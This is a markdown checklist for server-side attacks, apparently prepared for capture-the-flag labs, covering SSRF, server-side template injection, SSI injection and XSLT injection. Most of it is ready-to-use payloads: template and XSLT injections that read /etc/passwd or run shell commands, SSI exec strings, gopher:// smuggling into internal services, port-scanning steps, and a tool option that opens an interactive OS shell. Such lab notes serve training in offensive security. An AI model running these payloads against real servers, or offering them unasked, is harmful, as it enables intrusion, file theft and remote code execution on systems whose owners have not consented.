# Server-Side Attacks Checklist

**Rule:** Identify what the server processes from user input → confirm the vulnerability → escalate to RCE.

---

## SSRF

### Identify & Confirm
- [ ] Find parameters that accept URLs or hostnames
- [ ] Set up `nc -lnvp 8000` and point the parameter at your IP — callback confirms SSRF
- [ ] Point parameter at `http://127.0.0.1/index.php` — HTML in response = non-blind; generic message = blind

### Non-Blind Exploitation
- [ ] Pull internal page: `vulnerable_param=http://internal.host/admin.php`
- [ ] LFI: `vulnerable_param=file:///etc/passwd`
- [ ] Enumerate internal endpoints via ffuf (filter Apache error string)
- [ ] Access restricted admin pages directly through the SSRF

### Port Scanning (both blind and non-blind)
- [ ] `seq 1 10000 > ports.txt`
- [ ] Identify closed-port error message first
- [ ] Run ffuf with `-fr "<closed-port-error>"`
- [ ] Note open ports — check for web apps (80, 8000, 8080), databases (3306, 5432), caches (6379)

### gopher:// (POST requests to internal services)
- [ ] Build raw HTTP POST request
- [ ] URL-encode spaces as `%20`, newlines as `%0D%0A`
- [ ] Prefix with `gopher://host:port/_`
- [ ] Double URL-encode entire gopher URL when sending inside a POST parameter
- [ ] Use Gopherus for SMTP, MySQL, Redis, FastCGI, etc.

---

## SSTI

### Identify & Fingerprint
- [ ] Use `-G --data-urlencode` for ALL payloads — never raw curl with `{{}}`
- [ ] Inject `${7*7}` → executed? (Freemarker/other) : not executed → next
- [ ] Inject `{{7*7}}` → executed (49)? → next : not executed → other engine
- [ ] Inject `{{7*'7'}}` → 7777777 = Jinja2 / 49 = Twig

### Jinja2 (Python/Flask)
- [ ] Info: `{{ config.items() }}`
- [ ] LFI: `{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}`
- [ ] Find flag: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name flag* 2>/dev/null').read() }}`
- [ ] Read flag: `{{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }}`

### Twig (PHP)
- [ ] Info: `{{ _self }}`
- [ ] LFI (try first): `{{ '/etc/passwd'|file_excerpt(1,-1) }}` — Symfony only
- [ ] Find flag: `{{ ['find / -name flag* 2>/dev/null'] | filter('system') }}`
- [ ] Read flag: `{{ ['cat /flag.txt'] | filter('system') }}`
- [ ] If `file_excerpt` fails → use `filter('system')` with `cat` instead

### Twig via SSRF (spaces break URL parsing)
- [ ] Remove ALL spaces from Twig syntax: `{{['cmd']|filter('system')}}` not `{{ ['cmd'] | filter('system') }}`
- [ ] Use `%09` (tab) for spaces inside the command string: `{{['cat%09/flag.txt']|filter('system')}}`
- [ ] Use `--data-urlencode` for the outer `api` parameter — do NOT use raw `-d`

### Automated
- [ ] `python3 sstimap.py -u "http://<TARGET>/?param=test"` — auto-detect
- [ ] `-S <cmd>` for single command, `--os-shell` for interactive shell

---

## SSI Injection

### Identify
- [ ] Look for `.shtml`, `.shtm`, `.stm` file extensions in responses/redirects
- [ ] Inject `<!--#printenv -->` and fetch the `.shtml` page — env vars = confirmed

### Exploit (always two steps)
- [ ] Step 1: `curl -s -G "http://<TARGET>/index.php" --data-urlencode 'param=<!--#exec cmd="COMMAND" -->'`
- [ ] Step 2: `curl -s "http://<TARGET>/page.shtml"`
- [ ] Find flag: `<!--#exec cmd="find / -name flag* 2>/dev/null" -->`
- [ ] Read flag: `<!--#exec cmd="cat /flag.txt" -->`

### Pitfall Reminders
- [ ] Output appears on `.shtml` fetch, NOT on the submission response
- [ ] Submit payload first, THEN fetch the `.shtml` page

---

## XSLT Injection

### Identify & Fingerprint
- [ ] Inject `<` → 500 error suggests XSLT processing
- [ ] Inject `<xsl:value-of select="system-property('xsl:version')" />` → version printed = confirmed
- [ ] Note XSLT version — 1.0 (libxslt) vs 2.0+ changes available functions
- [ ] Note if PHP functions are available — required for LFI and RCE

### Exploit
- [ ] LFI (PHP): `<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />`
- [ ] LFI (XSLT 2.0): `<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />`
- [ ] Find flag: `<xsl:value-of select="php:function('system','find / -name flag* 2>/dev/null')" />`
- [ ] Read flag: `<xsl:value-of select="php:function('system','cat /flag.txt')" />`

### Pitfall Reminders
- [ ] `unparsed-text()` requires XSLT 2.0 — check version before using
- [ ] PHP functions must be enabled in XSLT processor config — not always available
- [ ] Use `-G --data-urlencode` — raw curl mangles `<` and `>`

---

## Universal Reminders
- [ ] Always read form HTML — GET vs POST, action URL, exact parameter name
- [ ] Always use `-G --data-urlencode` for payloads with special characters
- [ ] Find flag path with `find / -name flag* 2>/dev/null` before reading
- [ ] Prefer LFI over RCE when file path is already known — simpler and cleaner
